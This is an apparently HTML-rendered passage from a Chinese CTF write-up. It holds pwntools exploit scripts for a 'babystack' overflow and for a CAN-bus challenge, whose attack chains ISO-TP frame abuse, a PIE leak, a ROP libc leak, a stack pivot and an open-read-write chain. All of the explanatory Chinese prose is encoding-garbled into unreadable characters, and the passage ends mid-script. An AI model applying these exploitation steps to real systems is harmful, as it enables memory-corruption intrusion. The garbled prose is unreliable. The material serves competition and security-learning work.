</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=s1>&#39;./babystack&#39;</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># </span>
</span></span><span class=line><span class=cl><span class=n>choice</span> <span class=o>=</span> <span class=mh>0x001</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-11b07bf3af.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>     <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>     <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u32</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uru64</span>   <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:])</span>
</span></span><span class=line><span class=cl><span class=n>leak</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span>               <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>name</span><span class=p>))))</span>
</span></span><span class=line><span class=cl><span class=n>libc_os</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                <span class=p>:</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>clear</span>       <span class=o>=</span>       <span class=k>lambda</span>                            <span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;clear&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_sb</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Enter your flag1:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debug</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Enter your flag2:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x108</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1337abc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=è½¦è”ç½‘>è½¦è”ç½‘</h1><h2 id=can>Can</h2><p>æ²™ç®±</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-YAML data-lang=YAML><span class=line><span class=cl><span class=w> </span><span class=l>line  CODE  JT   JF      K</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>=================================</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0000</span><span class=p>:</span><span class=w> </span><span class=m>0x20</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000004</span><span class=w>  </span><span class=l>A = arch</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0001</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0xc000003e</span><span class=w>  </span><span class=l>if (A != ARCH_X86_64) goto 0008</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0002</span><span class=p>:</span><span class=w> </span><span class=m>0x20</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000000</span><span class=w>  </span><span class=l>A = sys_number</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0003</span><span class=p>:</span><span class=w> </span><span class=m>0x35</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x01</span><span class=w> </span><span class=m>0x40000000</span><span class=w>  </span><span class=l>if (A &lt; 0x40000000) goto 0005</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0004</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x03</span><span class=w> </span><span class=m>0xffffffff</span><span class=w>  </span><span class=l>if (A != 0xffffffff) goto 0008</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0005</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x02</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x0000003b</span><span class=w>  </span><span class=l>if (A == execve) goto 0008</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0006</span><span class=p>:</span><span class=w> </span><span class=m>0x15</span><span class=w> </span><span class=m>0x01</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000142</span><span class=w>  </span><span class=l>if (A == execveat) goto 0008</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0007</span><span class=p>:</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x7fff0000</span><span class=w>  </span><span class=l>return ALLOW</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>0008</span><span class=p>:</span><span class=w> </span><span class=m>0x06</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00</span><span class=w> </span><span class=m>0x00000000</span><span class=w>  </span><span class=l>return KILL</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¤§æ¦‚åˆ†æä¸€ä¸‹é€»è¾‘ï¼Œå…ˆæ˜¯ä¸€ä¸ªå¯†ç </p><p><img src=/img/2025-QWNT/50.png alt=img></p><p>ç„¶åå¯ä»¥è¾“å…¥æŒ‡ä»¤ï¼Œä½†è¿™ä¸Šé¢è¿™å‡ ä¸ªæŒ‡ä»¤éƒ½æ²¡ä»€ä¹ˆç”¨ã€‚ä¸»è¦æ˜¯ä¸‹é¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€3ç§ç±»å‹çš„ ISO-TP å¸§</p><ul><li>SF - å•å¸§</li><li>FF - é¦–å¸§<ul><li>è¾“å…¥<code>1#10xxxx</code></li></ul></li><li>CF - è¿ç»­å¸§<ul><li>è¿ç»­è¾“å…¥ <code>1#21...</code>ã€<code>1#22...</code>ã€<code>1#23...</code> åˆ°äº†få°±å†å›åˆ°1</li></ul></li></ul><p>å¤§æ¦‚å°è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥åˆ©ç”¨å¤„ç† CF å¸§çš„è¿™ä¸ª if åˆ¤æ–­æ¥æ³„éœ² pie</p><p><img src=/img/2025-QWNT/51.png alt=img></p><p>æ²¡ç»†çœ‹å¤„ç†çš„é€»è¾‘ï¼Œä½†å¤§æ¦‚å°è¯•äº†ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Enter magic number:\n&#39;</span><span class=p>,</span><span class=s1>&#39;12803159&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#1020414141414141&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2142424242424242&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2243434343434343&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2344444444444444&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1#2445454545454545&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å°±èƒ½æ‰§è¡Œåˆ°è¿™ä¸ªelseåˆ†æ”¯ï¼Œåº”è¯¥æ˜¯è¾“å…¥çš„ CF å¸§ä¸åˆæ³•å¯¼è‡´çš„</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªå‡½æ•°</p><p><img src=/img/2025-QWNT/52.png alt=img></p><p>memcpyæ²¡æœ‰å¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå½“æ»¡è¶³æ¡ä»¶çš„æ—¶å€™å°±ä¼šæ‰§è¡Œä¸‹é¢è¿™ä¸ª p_sub_16E0, å­˜æ”¾åœ¨ buf_ + 0x100 çš„ä½ç½®</p><p><img src=/img/2025-QWNT/53.png alt=img></p><p>å¯ä»¥å…ˆå‘é€ä¸€ä¸ª FF å¸§ï¼Œä¾‹å¦‚ï¼šå‘é€ <code>1#1008...</code>, å‘è¿™ä¸ªå¸§æ˜¯ä¸ºäº†è®¾å®š ::n çš„å¤§å° , ç”±1#1åé¢çš„ä¸‰ä¸ªæ•°å­—æ¥å†³å®šï¼Œè¿™ä¸ªä¾‹å­ä¸­ ::n ä¼šè¢«è®¾å®šä¸º 8ã€‚</p><p>æ³„éœ²å‡º pie_base ä¹‹åéœ€è¦é‡æ–°è®¾ç½® FF å¸§ï¼ŒæŠŠretå†™åˆ°å¼€å¤´ï¼Œæ¥ç€å°±åˆ©ç”¨ CF å¸§çš„memcpyå¸ƒç½®ropé“¾æ¥æ³„éœ²libcã€‚è¿™é‡Œropé“¾çš„ç»“æ„æ˜¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=n>puts</span><span class=p>(</span><span class=n>fgets_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rbp_ret</span>
</span></span><span class=line><span class=cl><span class=n>bss_addr</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000130</span><span class=n>F</span>                 <span class=n>mov</span>     <span class=n>rdx</span><span class=p>,</span> <span class=n>cs</span><span class=p>:</span><span class=n>stdin</span>   <span class=p>;</span> <span class=n>stream</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>0000000000001316</span>                 <span class=n>mov</span>     <span class=n>esi</span><span class=p>,</span> <span class=mi>200</span><span class=n>h</span>       <span class=p>;</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000131</span><span class=n>B</span>                 <span class=n>mov</span>     <span class=n>rdi</span><span class=p>,</span> <span class=n>rbp</span>        <span class=p>;</span> <span class=n>s</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>000000000000131</span><span class=n>E</span>                 <span class=n>call</span>    <span class=n>_fgets</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åæˆ‘ä»¬æŠŠ p_sub_16E0 è¦†ç›–æˆè¿™ä¸ªgadget <code>push rdi ; pop rsp ; ret</code>ã€‚å› ä¸ºæ‰§è¡Œ p_sub_16E0 ä¹‹å‰å¯„å­˜å™¨çš„çŠ¶æ€æ˜¯è¿™æ ·çš„</p><p><img src=/img/2025-QWNT/54.png alt=img></p><p>ç”¨è¿™ä¸ªgadgetå°±èƒ½æŠŠæ ˆè¿ç§»åˆ°bssæ®µä¸Šï¼Œæœ€åé€šè¿‡fgetsçš„æº¢å‡ºæ¥å¸ƒç½®orwçš„ropé“¾å³å¯</p><p>å¤§æ¦‚æ³„éœ²äº†ä¸€ä¸‹è¿œç¨‹çš„libc</p><p><img src=/img/2025-QWNT/55.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=s1>&#39;./pwn&#39;</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc6_2.39-0ubuntu8.6_amd64.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># </span>
</span></span><span class=line><span class=cl><span class=n>choice</span> <span class=o>=</span> <span class=mh>0x001</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-13470b3c3e.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>     <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>data</span>             <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span>           <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>     <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u32</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>data</span>               <span class=p>:</span><span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uru64</span>   <span class=o>=</span> <span class=k>lambda</span>                    <span class=p>:</span><span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:])</span>
</span></span><span class=line><span class=cl><span class=n>leak</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span>               <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>name</span><span class=p>))))</span>
